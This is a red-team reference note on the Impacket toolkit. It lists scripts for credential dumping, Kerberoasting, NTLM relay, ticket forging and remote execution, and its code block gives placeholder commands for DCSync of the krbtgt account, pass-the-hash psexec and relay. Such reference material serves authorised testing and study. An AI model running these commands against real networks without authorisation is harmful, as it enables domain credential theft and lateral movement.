---
title: Impacket
aliases: ["impacket", "secretsdump", "GetUserSPNs", "smbexec", "wmiexec", "psexec.py"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Fortra (formerly SecureAuth)"
source_url: "https://github.com/fortra/impacket"
verified: true
related: ["[[DCSync]]", "[[Kerberoasting]]", "[[AS-REP Roasting]]", "[[Pass-the-Hash]]", "[[NTLM Relay]]", "[[Remote Execution & Lateral Movement (Windows)]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Impacket

> [!summary] One-liner
> A Python library and collection of scripts for working with Windows network protocols — the go-to Linux-based toolkit for AD attacks: credential dumping, Kerberos abuse, lateral movement, and NTLM relay.

## Key scripts

| Script | Purpose | Related note |
|---|---|---|
| `secretsdump.py` | Remote/offline credential extraction (DCSync, SAM, LSA, DCC2) | [[DCSync]], [[SAM and LSA Secrets Dump]] |
| `GetUserSPNs.py` | Kerberoasting (request + crack service tickets) | [[Kerberoasting]] |
| `GetNPUsers.py` | AS-REP Roasting | [[AS-REP Roasting]] |
| `psexec.py` | PsExec-style remote execution via SMB | [[Remote Execution & Lateral Movement (Windows)]] |
| `smbexec.py` | Semi-interactive shell via SMB service creation | [[Remote Execution & Lateral Movement (Windows)]] |
| `wmiexec.py` | Remote execution via WMI | [[Remote Execution & Lateral Movement (Windows)]] |
| `atexec.py` | Remote execution via scheduled tasks | [[Remote Execution & Lateral Movement (Windows)]] |
| `dcomexec.py` | Remote execution via DCOM | [[Remote Execution & Lateral Movement (Windows)]] |
| `ntlmrelayx.py` | NTLM relay server | [[NTLM Relay]] |
| `getST.py` | Request service tickets (S4U2self/proxy) | [[Constrained Delegation]], [[Resource-Based Constrained Delegation (RBCD)]] |
| `getTGT.py` | Request TGT with password/hash/key | [[Kerberos Authentication Flow]] |
| `ticketer.py` | Forge Golden/Silver tickets | [[Golden Ticket]], [[Silver Ticket]] |
| `lookupsid.py` | SID/RID enumeration | [[RID]], [[SID]] |
| `dpapi.py` | DPAPI masterkey/credential decryption | [[DPAPI Abuse]] |

## Common usage patterns
```bash
# DCSync
secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt

# Pass-the-hash remote exec
psexec.py -hashes :<NT_HASH> <DOMAIN>/<USER>@<TARGET>

# Kerberoasting
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# NTLM relay
ntlmrelayx.py -t smb://<TARGET> -smb2support

# Kerberos auth (using ccache)
export KRB5CCNAME=<ticket.ccache>
psexec.py -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>
```

## Related
- Windows equivalent: [[Mimikatz]] (many overlapping capabilities).
- NTLM relay: [[NTLM Relay]], paired with [[Responder]] for capture.
- Delegation abuse: [[Constrained Delegation]], [[Resource-Based Constrained Delegation (RBCD)]].
